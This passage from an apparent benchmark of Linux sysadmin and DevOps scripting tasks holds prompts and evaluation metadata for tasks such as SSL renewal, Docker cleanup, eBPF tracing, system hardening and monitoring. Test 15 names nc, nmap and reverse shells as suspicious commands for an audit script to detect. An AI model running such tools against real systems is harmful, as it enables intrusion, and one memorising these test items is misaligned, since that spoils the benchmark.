          "content": "\nCreate a script that verifies the integrity of the latest backup in `/backup/`:\n1. The backup directory contains data archives (`.tar.gz`) and a corresponding SHA256 checksum file (`.sha256`).\n2. The script must find the latest archive and its checksum file.\n3. It must recalculate the SHA256 hash of the archive and verify it against the contents of the checksum file.\n4. If the hash matches, it should then extract the archive to a temporary location.\n5. It then checks if a critical file, `/__CONFIG_VARS__`, exists within the extracted archive.\n6. Reports success or failure and cleans up the temporary files.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "verification",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_12",
      "name": "Test 12: Proactive SSL Certificate Management",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a script that automates SSL certificate lifecycle management:\n1. Scan a directory of nginx configuration files (`/etc/nginx/sites-enabled/`) to find all unique `server_name` directives.\n2. For each domain found, check its live SSL certificate's expiration date.\n3. If a certificate is expiring in less than 15 days, trigger a renewal using `certbot renew`.\n4. After attempting renewals, verify that the renewal was successful by checking the new expiration date.\n5. If and only if a certificate was successfully renewed, gracefully reload the nginx service.\n6. Log all actions and send a summary email to an administrator.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a script that automates SSL certificate lifecycle management:\n1. Scan a directory of nginx configuration files (`/etc/nginx/sites-enabled/`) to find all unique `server_name` directives.\n2. For each domain found, check its live SSL certificate's expiration date.\n3. If a certificate is expiring in less than 15 days, trigger a renewal using `certbot renew`.\n4. After attempting renewals, verify that the renewal was successful by checking the new expiration date.\n5. If and only if a certificate was successfully renewed, gracefully reload the nginx service.\n6. Log all actions and send a summary email to an administrator.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_13",
      "name": "Test 13: Intelligent Docker Cleanup Tool",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_containers",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux containers",
      "prompt": "\nCreate a Docker maintenance script with advanced logic:\n1. Remove all stopped containers.\n2. Remove dangling images and build cache.\n3. Remove unused volumes, but first, check if the volume name matches a pattern (`pgdata-*` or `esdata-*`) and if so, prompt for confirmation before deletion.\n4. Identify images that have not been used to run a container in the last 30 days and list them as candidates for removal.\n5. Provide a `--force` flag to bypass all confirmation prompts.\n6. Display a summary of reclaimed space, broken down by category (containers, images, volumes).\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a Docker maintenance script with advanced logic:\n1. Remove all stopped containers.\n2. Remove dangling images and build cache.\n3. Remove unused volumes, but first, check if the volume name matches a pattern (`pgdata-*` or `esdata-*`) and if so, prompt for confirmation before deletion.\n4. Identify images that have not been used to run a container in the last 30 days and list them as candidates for removal.\n5. Provide a `--force` flag to bypass all confirmation prompts.\n6. Display a summary of reclaimed space, broken down by category (containers, images, volumes).\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_14",
      "name": "Test 14: eBPF-based Performance Baseline",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a Python script using the `bcc` framework (eBPF) to capture a low-level performance baseline:\n1. Trace new process creation (`exec()` syscalls) for 60 seconds.\n2. Trace block I/O requests to show which processes are writing to disk.\n3. Capture TCP connection initiations (connects).\n4. Aggregate the captured data to show:\n   - Top 5 most frequently executed commands.\n   - Top 5 processes by I/O write volume.\n   - Top 5 most frequently contacted destination IPs.\n5. Output the final summary as a YAML file.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a Python script using the `bcc` framework (eBPF) to capture a low-level performance baseline:\n1. Trace new process creation (`exec()` syscalls) for 60 seconds.\n2. Trace block I/O requests to show which processes are writing to disk.\n3. Capture TCP connection initiations (connects).\n4. Aggregate the captured data to show:\n   - Top 5 most frequently executed commands.\n   - Top 5 processes by I/O write volume.\n   - Top 5 most frequently contacted destination IPs.\n5. Output the final summary as a YAML file.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_15",
      "name": "Test 15: User Audit with Anomaly Detection",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a user audit script that performs security checks and basic anomaly detection:\n1. Identify all non-system user accounts.\n2. For each user, check for passwordless sudo privileges in `/etc/sudoers.d/`.\n3. Check the user's `.bash_history` for suspicious commands (e.g., `nc`, `nmap`, reverse shells).\n4. ANOMALY: Flag any user account whose UID is < 1000 but is not a standard system account (like root, daemon, bin).\n5. ANOMALY: Flag any user who owns files in `/tmp` that are SUID.\n6. Format the output as a report with [PASS], [FAIL], and [ANOMALY] markers.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a user audit script that performs security checks and basic anomaly detection:\n1. Identify all non-system user accounts.\n2. For each user, check for passwordless sudo privileges in `/etc/sudoers.d/`.\n3. Check the user's `.bash_history` for suspicious commands (e.g., `nc`, `nmap`, reverse shells).\n4. ANOMALY: Flag any user account whose UID is < 1000 but is not a standard system account (like root, daemon, bin).\n5. ANOMALY: Flag any user who owns files in `/tmp` that are SUID.\n6. Format the output as a report with [PASS], [FAIL], and [ANOMALY] markers.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_16",
      "name": "Test 16: Multi-Endpoint API Health Checker",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "verification",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a concurrent API health checker in Python using `asyncio` and `aiohttp`:\n1. Read a list of API endpoints and their expected success conditions from a YAML config file. (e.g., URL, expected status code, optional JSON key:value to check in response).\n2. Concurrently check all endpoints.\n3. Implement a retry mechanism with exponential backoff for failed checks (3 retries max).\n4. If an endpoint is definitively down after retries, log a critical alert.\n5. Expose the health status of all monitored endpoints via a simple local HTTP server on port 9100 (e.g., /metrics).\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a concurrent API health checker in Python using `asyncio` and `aiohttp`:\n1. Read a list of API endpoints and their expected success conditions from a YAML config file. (e.g., URL, expected status code, optional JSON key:value to check in response).\n2. Concurrently check all endpoints.\n3. Implement a retry mechanism with exponential backoff for failed checks (3 retries max).\n4. If an endpoint is definitively down after retries, log a critical alert.\n5. Expose the health status of all monitored endpoints via a simple local HTTP server on port 9100 (e.g., /metrics).\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "verification",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_17",
      "name": "Test 17: Git Repository State Management",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a git management script that can `save` or `restore` the state of a repository:\n- `save`: Creates a named snapshot. It should record the current branch name, the latest commit hash, and the status of uncommitted changes (by creating a patch file). It stores this info in a local `.git/snapshots/` directory.\n- `restore`: Lists all saved snapshots. When a snapshot name is provided, it checks for uncommitted changes (and fails if any exist), then checks out the specified commit hash and applies the corresponding patch file to restore the working directory state.\n- Handle edge cases like being in a detached HEAD state.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a git management script that can `save` or `restore` the state of a repository:\n- `save`: Creates a named snapshot. It should record the current branch name, the latest commit hash, and the status of uncommitted changes (by creating a patch file). It stores this info in a local `.git/snapshots/` directory.\n- `restore`: Lists all saved snapshots. When a snapshot name is provided, it checks for uncommitted changes (and fails if any exist), then checks out the specified commit hash and applies the corresponding patch file to restore the working directory state.\n- Handle edge cases like being in a detached HEAD state.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_18",
      "name": "Test 18: OS-Agnostic Update and Health Check",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "verification",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite an update script in Python that is OS-agnostic (works on Debian/Ubuntu and RHEL/CentOS/Fedora):\n1. Detect the system's package manager (`apt`, `yum`, `dnf`).\n2. Before updating, check for critical service health (e.g., is a database listener on port 5432 running?). If not, abort the update.\n3. Perform a dry-run of the update to list pending packages.\n4. Apply only security-related updates.\n5. After updating, re-run the critical service health check to ensure nothing broke.\n6. Log the entire process, including the list of updated packages, to a file.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite an update script in Python that is OS-agnostic (works on Debian/Ubuntu and RHEL/CentOS/Fedora):\n1. Detect the system's package manager (`apt`, `yum`, `dnf`).\n2. Before updating, check for critical service health (e.g., is a database listener on port 5432 running?). If not, abort the update.\n3. Perform a dry-run of the update to list pending packages.\n4. Apply only security-related updates.\n5. After updating, re-run the critical service health check to ensure nothing broke.\n6. Log the entire process, including the list of updated packages, to a file.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "verification",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_19",
      "name": "Test 19: Process Sandboxing with Systemd",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a systemd service unit file to run an application (`/usr/local/bin/unsafe_app`) in a secure sandbox:\n1. Use dynamic user (`DynamicUser=yes`) so it doesn't run as a persistent user.\n2. Prevent the process from gaining new privileges.\n3. Make the filesystem read-only except for a specific writable directory in `/var/lib/unsafe_app`.\n4. Blacklist kernel modules like `bluetooth` and `usb-storage` from being loaded by the service.\n5. Restrict network access to only allow outgoing TCP connections on port 443.\n6. Add comments explaining what each security directive does.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a systemd service unit file to run an application (`/usr/local/bin/unsafe_app`) in a secure sandbox:\n1. Use dynamic user (`DynamicUser=yes`) so it doesn't run as a persistent user.\n2. Prevent the process from gaining new privileges.\n3. Make the filesystem read-only except for a specific writable directory in `/var/lib/unsafe_app`.\n4. Blacklist kernel modules like `bluetooth` and `usb-storage` from being loaded by the service.\n5. Restrict network access to only allow outgoing TCP connections on port 443.\n6. Add comments explaining what each security directive does.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_20",
      "name": "Test 20: Graph-Based Service Dependency Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a Python script that models service dependencies as a directed graph:\n1. Read a service dependency config file (e.g., `A: B, C`).\n2. Build a graph representation (e.g., using the `networkx` library).\n3. Given a target service to start (e.g., 'A'), determine and print its entire dependency chain in the correct start order.\n4. Given a target service to stop (e.g., 'B'), determine and print all services that depend on it (the impact list).\n5. Detect and report any circular dependencies in the graph, printing the cycle path.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a Python script that models service dependencies as a directed graph:\n1. Read a service dependency config file (e.g., `A: B, C`).\n2. Build a graph representation (e.g., using the `networkx` library).\n3. Given a target service to start (e.g., 'A'), determine and print its entire dependency chain in the correct start order.\n4. Given a target service to stop (e.g., 'B'), determine and print all services that depend on it (the impact list).\n5. Detect and report any circular dependencies in the graph, printing the cycle path.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_21",
      "name": "Test 21: Intelligent Web Server Troubleshooter",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a troubleshooting script that diagnoses a web server issue:\n1. It takes a URL as an argument.\n2. It first checks local DNS resolution for the domain.\n3. It then simulates the request path:\n   - Checks connectivity to the local gateway.\n   - Checks connectivity to the resolved IP.\n   - Performs a full TLS handshake and validates the certificate chain using `openssl s_client`.\n   - Makes an HTTP GET request and checks the HTTP status code and response headers.\n4. Based on the point of failure, it should provide a specific hypothesis (e.g., \"Failure at DNS lookup suggests a resolver issue\" or \"Failure at TLS handshake with 'certificate expired' error suggests an SSL issue\").\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a troubleshooting script that diagnoses a web server issue:\n1. It takes a URL as an argument.\n2. It first checks local DNS resolution for the domain.\n3. It then simulates the request path:\n   - Checks connectivity to the local gateway.\n   - Checks connectivity to the resolved IP.\n   - Performs a full TLS handshake and validates the certificate chain using `openssl s_client`.\n   - Makes an HTTP GET request and checks the HTTP status code and response headers.\n4. Based on the point of failure, it should provide a specific hypothesis (e.g., \"Failure at DNS lookup suggests a resolver issue\" or \"Failure at TLS handshake with 'certificate expired' error suggests an SSL issue\").\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_22",
      "name": "Test 22: Compliance Checker with Auto-Remediation",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "verification",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nWrite a compliance script that checks system settings against a defined policy in a YAML file.\n- The YAML file defines checks, expected values, and remediation commands.\n- The script should:\n  1. Parse the policy file.\n  2. For each policy, check the current system state (e.g., check an sshd_config value, check a sysctl parameter).\n  3. Report if the system is compliant or non-compliant for that policy.\n  4. If a `--remediate` flag is passed, execute the defined remediation command for any non-compliant policies.\n- Provide an example policy YAML for checking that `PermitRootLogin` is `no` in `sshd_config`.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a compliance script that checks system settings against a defined policy in a YAML file.\n- The YAML file defines checks, expected values, and remediation commands.\n- The script should:\n  1. Parse the policy file.\n  2. For each policy, check the current system state (e.g., check an sshd_config value, check a sysctl parameter).\n  3. Report if the system is compliant or non-compliant for that policy.\n  4. If a `--remediate` flag is passed, execute the defined remediation command for any non-compliant policies.\n- Provide an example policy YAML for checking that `PermitRootLogin` is `no` in `sshd_config`.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "verification",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_23",
      "name": "Test 23: Dynamic Load Balancer Health Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a script that queries a load balancer's API (e.g., HAProxy's stats socket or Traefik's API) to perform a health analysis:\n1. Fetch the list of all backend servers and their current status ('UP', 'DOWN').\n2. For each 'UP' backend, check its current session count and request rate.\n3. Identify 'hotspots': any backend handling >50% more sessions than the average of its peers.\n4. Identify 'flapping': any backend that has changed state (UP to DOWN or vice-versa) more than 3 times in the last 10 minutes (requires storing state between runs).\n5. Generate a JSON report with overall health, and lists of any identified 'hotspot' or 'flapping' backends.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a script that queries a load balancer's API (e.g., HAProxy's stats socket or Traefik's API) to perform a health analysis:\n1. Fetch the list of all backend servers and their current status ('UP', 'DOWN').\n2. For each 'UP' backend, check its current session count and request rate.\n3. Identify 'hotspots': any backend handling >50% more sessions than the average of its peers.\n4. Identify 'flapping': any backend that has changed state (UP to DOWN or vice-versa) more than 3 times in the last 10 minutes (requires storing state between runs).\n5. Generate a JSON report with overall health, and lists of any identified 'hotspot' or 'flapping' backends.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_24",
      "name": "Test 24: Proactive Database Performance Tuning",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nWrite a PostgreSQL script that analyzes performance and generates tuning recommendations:\n1. Identify the top 5 most time-consuming queries from `pg_stat_statements`.\n2. For each of those queries, generate an `EXPLAIN (ANALYZE, BUFFERS)` plan.\n3. Analyze the query plans to detect common anti-patterns like sequential scans on large tables or nested loop joins with high row counts.\n4. Check for unused indexes and bloated tables (high percentage of dead tuples).\n5. Based on the findings, generate a report with specific, actionable recommendations, such as 'Recommendation: Create index on table `users` column `email`' or 'Recommendation: Run VACUUM FULL on table `events`'.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a PostgreSQL script that analyzes performance and generates tuning recommendations:\n1. Identify the top 5 most time-consuming queries from `pg_stat_statements`.\n2. For each of those queries, generate an `EXPLAIN (ANALYZE, BUFFERS)` plan.\n3. Analyze the query plans to detect common anti-patterns like sequential scans on large tables or nested loop joins with high row counts.\n4. Check for unused indexes and bloated tables (high percentage of dead tuples).\n5. Based on the findings, generate a report with specific, actionable recommendations, such as 'Recommendation: Create index on table `users` column `email`' or 'Recommendation: Run VACUUM FULL on table `events`'.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_25",
      "name": "Test 25: Runtime Container Security Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_containers",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux containers",
      "prompt": "\nCreate a container security script that analyzes running containers for runtime threats:\n1. For each running container, inspect its network namespace and identify any processes listening on `0.0.0.0`.\n2. Use `docker exec` to run a check inside each container for newly created executable files in `/tmp` or `/var/tmp`.\n3. Check the container's logs for anomalous patterns (e.g., repeated authentication failures, stack traces).\n4. Cross-reference the running container image against a vulnerability database using `trivy` or a similar tool.\n5. Generate a report prioritizing findings by container, with severity levels for each issue.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a container security script that analyzes running containers for runtime threats:\n1. For each running container, inspect its network namespace and identify any processes listening on `0.0.0.0`.\n2. Use `docker exec` to run a check inside each container for newly created executable files in `/tmp` or `/var/tmp`.\n3. Check the container's logs for anomalous patterns (e.g., repeated authentication failures, stack traces).\n4. Cross-reference the running container image against a vulnerability database using `trivy` or a similar tool.\n5. Generate a report prioritizing findings by container, with severity levels for each issue.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_26",
      "name": "Test 26: Canary Deployment Automation",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_automation",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux automation",
      "prompt": "\nWrite a deployment script for a 'canary release' strategy:\n1. It takes a new Docker image version as an argument.\n2. It first deploys the new version to a single 'canary' instance.\n3. It then runs a suite of integration tests against the canary instance.\n4. Simultaneously, it monitors key metrics from the canary (e.g., error rate, latency) for 5 minutes.\n5. If tests pass and metrics are stable, it proceeds to perform a rolling update of the main production pool with the new image.\n6. If any step fails, it automatically rolls back by destroying the canary instance and logging the failure.\nThe script should interact with a container orchestrator's API or CLI (e.g., `docker-compose`, `kubectl`).\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a deployment script for a 'canary release' strategy:\n1. It takes a new Docker image version as an argument.\n2. It first deploys the new version to a single 'canary' instance.\n3. It then runs a suite of integration tests against the canary instance.\n4. Simultaneously, it monitors key metrics from the canary (e.g., error rate, latency) for 5 minutes.\n5. If tests pass and metrics are stable, it proceeds to perform a rolling update of the main production pool with the new image.\n6. If any step fails, it automatically rolls back by destroying the canary instance and logging the failure.\nThe script should interact with a container orchestrator's API or CLI (e.g., `docker-compose`, `kubectl`).\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_27",
      "name": "Test 27: Ansible-Based System Hardening",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a modular Ansible playbook named `harden.yml` to enforce system security.\nThe playbook should be structured with roles:\n1. A role named `ssh` that ensures `PermitRootLogin` and `PasswordAuthentication` are set to `no`.\n2. A role named `firewall` that uses the `ufw` module to enable the firewall and allow only TCP traffic on ports 22, 80, and 443.\n3. A role named `kernel` that uses the `sysctl` module to set `net.ipv4.ip_forward` to 0 and `net.ipv4.conf.all.accept_redirects` to 0.\n4. The main `harden.yml` playbook should apply all three roles to a group of servers named `webservers`.\nInclude the necessary directory structure and example files for the roles.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a modular Ansible playbook named `harden.yml` to enforce system security.\nThe playbook should be structured with roles:\n1. A role named `ssh` that ensures `PermitRootLogin` and `PasswordAuthentication` are set to `no`.\n2. A role named `firewall` that uses the `ufw` module to enable the firewall and allow only TCP traffic on ports 22, 80, and 443.\n3. A role named `kernel` that uses the `sysctl` module to set `net.ipv4.ip_forward` to 0 and `net.ipv4.conf.all.accept_redirects` to 0.\n4. The main `harden.yml` playbook should apply all three roles to a group of servers named `webservers`.\nInclude the necessary directory structure and example files for the roles.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_28",
      "name": "Test 28: Multi-System Monitoring Integration",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "multi_hop",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nWrite a Python script that acts as a metric aggregator:\n1. It queries a Prometheus endpoint to get the current rate of `http_requests_total`.\n2. It connects to an InfluxDB database to get the latest `cpu_usage_idle` value.\n3. It runs a local shell command to check the number of active `sshd` processes.\n4. It combines these three disparate metrics into a single, cohesive JSON object.\n5. If any data source fails, the corresponding JSON value should be `null`, but the script should not crash.\n6. The final JSON object is pushed to a Slack webhook URL with a status summary.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a Python script that acts as a metric aggregator:\n1. It queries a Prometheus endpoint to get the current rate of `http_requests_total`.\n2. It connects to an InfluxDB database to get the latest `cpu_usage_idle` value.\n3. It runs a local shell command to check the number of active `sshd` processes.\n4. It combines these three disparate metrics into a single, cohesive JSON object.\n5. If any data source fails, the corresponding JSON value should be `null`, but the script should not crash.\n6. The final JSON object is pushed to a Slack webhook URL with a status summary.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "multi_hop",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_29",
      "name": "Test 29: Automated Incident Response Playbook",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
